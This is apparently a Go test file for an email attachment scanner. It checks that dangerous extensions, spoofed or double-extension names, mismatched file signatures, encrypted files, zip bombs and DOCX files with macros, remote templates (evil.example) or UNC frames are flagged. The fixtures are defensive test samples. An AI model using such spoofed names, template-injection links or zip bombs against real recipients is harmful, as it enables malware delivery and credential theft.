package mailbox

import (
	"archive/zip"
	"bytes"
	"encoding/binary"
	"strconv"
	"strings"
	"testing"
)

// zipOf builds a package from name -> content.
func zipOf(t *testing.T, parts map[string]string) []byte {
	t.Helper()
	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)
	for name, body := range parts {
		w, err := zw.Create(name)
		if err != nil {
			t.Fatal(err)
		}
		w.Write([]byte(body))
	}
	if err := zw.Close(); err != nil {
		t.Fatal(err)
	}
	return buf.Bytes()
}

func docxParts(extra map[string]string) map[string]string {
	p := map[string]string{
		"[Content_Types].xml": `<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>`,
		"word/document.xml":   `<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"/>`,
	}
	for k, v := range extra {
		p[k] = v
	}
	return p
}

// pe is the smallest thing Sniff calls a Windows program.
func pe() []byte {
	b := make([]byte, 0x48)
	copy(b, "MZ")
	binary.LittleEndian.PutUint32(b[0x3c:], 0x40)
	copy(b[0x40:], "PE\x00\x00")
	return b
}

func TestDangerousAttachmentsAreNeverReadable(t *testing.T) {
	for _, name := range []string{
		"setup.exe", "invoice.pdf.exe", "run.JS", "a.scr", "x.bat", "x.cmd", "x.ps1", "x.vbs", "x.jse", "x.wsf",
		"x.msi", "x.jar", "shortcut.lnk", "x.hta", "x.cpl", "x.reg", "x.com",
		"offer.docm", "prices.xlsm", "deck.pptm", "tpl.dotm", "addin.xlam",
		"disk.iso", "disk.img", "disk.vhd",
		"login.html", "page.htm", "logo.svg",
		"docs.zip", "docs.rar", "docs.7z", "docs.gz", "docs.tar",
		"report.exe.", "report.exe  ",
		"invoice\xe2\x80\xaefdp.exe", // U+202E shows it as invoiceexe.pdf
	} {
		s := CheckAttachment(Attachment{Name: name, Data: []byte("anything")})
		if !s.Danger || s.Format != "" || len(s.Why) == 0 {
			t.Errorf("%q: %+v, want danger with a reason and no format", name, s)
		}
	}
}

func TestDoubleExtensionAndPaddingAreNamed(t *testing.T) {
	s := CheckAttachment(Attachment{Name: "Invoice 1180.pdf.exe"})
	if !s.Danger || !strings.Contains(strings.Join(s.Why, " "), ".pdf.exe") {
		t.Errorf("double extension: %+v", s)
	}
	s = CheckAttachment(Attachment{Name: "invoice.pdf          .scr"})
	if !s.Danger || !strings.Contains(strings.Join(s.Why, " "), "فاصله") {
		t.Errorf("padded extension: %+v", s)
	}
}

func TestDeclaredTypeAndMagicMustAgree(t *testing.T) {
	zipped := zipOf(t, docxParts(nil))
	cases := []struct {
		name, mime string
		data       []byte
	}{
		{"offer.pdf", "", zipped},                                     // a zip called .pdf
		{"offer.pdf", "", []byte("<!DOCTYPE html><form>")},            // a web page called .pdf
		{"offer.pdf", "", []byte("hello, not a pdf")},                 // nothing at all
		{"offer.docx", "", []byte("%PDF-1.7\n")},                      // a pdf called .docx
		{"photo.jpg", "", pe()},                                       // a program called .jpg
		{"notes.txt", "", pe()},                                       // a program called .txt
		{"list.csv", "", zipped},                                      // an archive called .csv
		{"offer.pdf", "application/x-msdownload", []byte("%PDF-1.7")}, // declared a program
		{"page.pdf", "text/html; charset=utf-8", []byte("%PDF-1.7")},  // declared a web page
	}
	for _, c := range cases {
		s := CheckAttachment(Attachment{Name: c.name, Type: c.mime, Data: c.data})
		if !s.Danger {
			t.Errorf("%s (%s, %.12q): not flagged: %+v", c.name, c.mime, c.data, s)
		}
	}
	if s := CheckAttachment(Attachment{Name: "Proforma 1180.pdf", Type: "application/pdf", Data: []byte("%PDF-1.7\n1 0 obj<<>>endobj")}); s.Danger || s.Format != "pdf" {
		t.Errorf("a plain PDF: %+v", s)
	}
	if s := CheckAttachment(Attachment{Name: "offer.docx", Data: zipped}); s.Danger || s.Format != "docx" {
		t.Errorf("a plain DOCX: %+v", s)
	}
	if s := CheckAttachment(Attachment{Name: "Scan.jpg", Data: []byte("\xff\xd8\xff\xe0 jfif")}); s.Danger || s.Format != "" {
		t.Errorf("a real photo is harmless and not read: %+v", s)
	}
}

func TestEncryptedDocumentsAreNotRead(t *testing.T) {
	if s := CheckAttachment(Attachment{Name: "a.pdf", Data: []byte("%PDF-1.7\ntrailer<</Encrypt 5 0 R>>")}); !s.Danger {
		t.Errorf("encrypted PDF: %+v", s)
	}
	cfb := append([]byte("\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1"), utf16le("EncryptionInfo")...)
	if s := CheckAttachment(Attachment{Name: "prices.xlsx", Data: cfb}); !s.Danger || !strings.Contains(s.Why[0], "گذرواژه") {
		t.Errorf("password-protected workbook: %+v", s)
	}
}

func TestZipBombsAreRefusedFromTheDirectory(t *testing.T) {
	many := map[string]string{}
	for i := 0; i <= MaxZipEntries; i++ {
		many["word/media/p"+strconv.Itoa(i)+".xml"] = ""
	}
	if why := InspectZip(zipOf(t, docxParts(many)), "docx"); len(why) == 0 || why[0] != whyBomb {
		t.Errorf("too many entries: %v", why)
	}

	// Fifty-odd megabytes of zeros deflate to a few dozen kilobytes. Written in
	// chunks, so the test itself never holds the bomb.
	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)
	for name, body := range docxParts(nil) {
		w, _ := zw.Create(name)
		w.Write([]byte(body))
	}
	w, _ := zw.Create("word/media/zeros.bin")
	chunk := make([]byte, 1<<20)
	for i := 0; i < MaxZipUnpacked>>20+1; i++ {
		w.Write(chunk)
	}
	zw.Close()
	if s := CheckAttachment(Attachment{Name: "big.docx", Data: buf.Bytes()}); !s.Danger || !strings.Contains(strings.Join(s.Why, " "), "بمب") {
		t.Errorf("%d compressed bytes that unpack past the cap: %+v", buf.Len(), s)
	}
}

func TestMacrosEmbeddedObjectsAndRemoteTemplatesInsideADocx(t *testing.T) {
	bad := map[string]map[string]string{
		"macro":       {"word/vbaProject.bin": "x"},
		"macro type":  {"[Content_Types].xml": `<Types><Override ContentType="application/vnd.ms-word.document.macroEnabled.main+xml"/></Types>`},
		"ole object":  {"word/embeddings/oleObject1.bin": "x"},
		"activex":     {"word/activeX/activeX1.xml": "x"},
		"remote dotm": {"word/_rels/settings.xml.rels": `<Relationships><Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="https://evil.example/t.dotm" TargetMode="External"/></Relationships>`},
		"share frame": {"word/_rels/document.xml.rels": `<Relationships><Relationship Id="r2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/frame" Target="\\10.0.0.9\s\x.docx" TargetMode="External"/></Relationships>`},
		"not a docx":  {"word/document.xml": ""}, // replaced below
	}
	for what, extra := range bad {
		parts := docxParts(extra)
		if what == "not a docx" {
			delete(parts, "word/document.xml")
		}
		if s := CheckAttachment(Attachment{Name: "offer.docx", Data: zipOf(t, parts)}); !s.Danger {
			t.Errorf("%s: not flagged: %+v", what, s)
		}
	}
	// A template on the author's own disk is in most documents Word saves.
	local := docxParts(map[string]string{"word/_rels/settings.xml.rels": `<Relationships><Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="file:///C:\Users\a\Normal.dotm" TargetMode="External"/><Relationship Id="r3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://example.com" TargetMode="External"/></Relationships>`})
	if s := CheckAttachment(Attachment{Name: "offer.docx", Data: zipOf(t, local)}); s.Danger {
		t.Errorf("a local template and a hyperlink are not findings: %+v", s)
	}
}

func TestOversizeAndOldFormatsAreDescribedNotRead(t *testing.T) {
	big := append([]byte("%PDF-1.7\n"), make([]byte, MaxReadBytes)...)
	if s := CheckAttachment(Attachment{Name: "huge.pdf", Data: big}); s.Danger || s.Format != "" || s.Note == "" {
		t.Errorf("oversize: %+v", s)
	}
	if s := CheckAttachment(Attachment{Name: "old.doc", Data: []byte("\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1")}); s.Danger || s.Format != "" {
		t.Errorf("an old .doc has no reader here: %+v", s)
	}
}
